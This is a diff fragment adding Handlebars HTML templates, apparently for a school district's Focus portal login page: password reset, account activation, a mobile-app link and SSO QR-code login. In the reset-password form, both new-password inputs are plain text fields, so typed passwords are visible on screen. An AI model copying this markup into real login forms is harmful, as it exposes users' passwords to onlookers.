+				<div class="clear"></div>
+
+				<div class="registration-links">
+					<p>
+						<a href="../focus.html#" class="action-link" data-template="login">Login</a>
+					</p>
+				</div>
+			</div>
+		</form>
+	</script>
+
+	<script id="reset-password-template" type="text/x-handlebars-template">
+		<form class="ui form reset-password-form form-container">
+			<h4 class="registration-header">
+				Please enter a new password
+			</h4>
+
+			<input type="text" name="password" class="form-input" placeholder="Password">
+			<input type="text" name="password_2" class="form-input" placeholder="Password Again">
+			<input type="hidden" name="token" value="" placeholder="Password Again">
+
+			<div class="form-button-container">
+				<button class="form-button">Reset Password</button>
+
+				<div class="clear"></div>
+
+				<div class="registration-links">
+					<p>
+						<a href="../focus.html#" class="action-link" data-template="login">Login</a>
+					</p>
+				</div>
+			</div>
+		</form>
+	</script>
+
+	<script id="activate-user-template" type="text/x-handlebars-template">
+		<form class="form-container">
+			<h4 class="registration-header">
+				Your account has been activated.
+			</h4>
+
+			<div class="registration-links">
+				<p>
+					<a href="../focus.html" data-template="login">Login</a>
+				</p>
+			</div>
+		</form>
+	</script>
+
+	<script id="default-template" type="text/x-handlebars-template">
+		<form class="form-container">
+			<h4 class="registration-header">
+				{{header_text}}
+			</h4>
+
+			<div class="registration-links">
+				<p>
+					<a href="../focus.html#" class="action-link" data-template="login">Login</a>
+				</p>
+			</div>
+		</form>
+	</script>
+
+	<script id="mobile-app-template" type="text/x-handlebars-template">
+		<a class="mobile-app-link" href="https://focus.collierschools.com/focus/{{href}}" target="_blank">
+			<div class="mobile-app-link-content">
+				<img class="mobile-app-icon" src="assets/login/android.png">
+				<div class="mobile-app-text">
+					Tap here to get the <b>{{type}} App</b>
+				</div>
+			</div>
+		</a>
+	</script>
+
+	<script id="sso-qr-code-template" type="text/x-handlebars-template">
+		<div id="secret-form" class="form-container" style="text-align: center">
+			<h3 class="qr-code-scan-message">
+				{{#t}}Please scan the QR code to log in.{{/t}}
+			</h3>
+			<div class="qr-code" data-qr="{{url}}"></div>
+			<h3>
+				<a href="../focus.html#" class="action-link back-to-login-link" data-template="login">{{#t}}Return to Login{{/t}}</a>
+			</h3>
+		</div>
+	</script>
+</html>
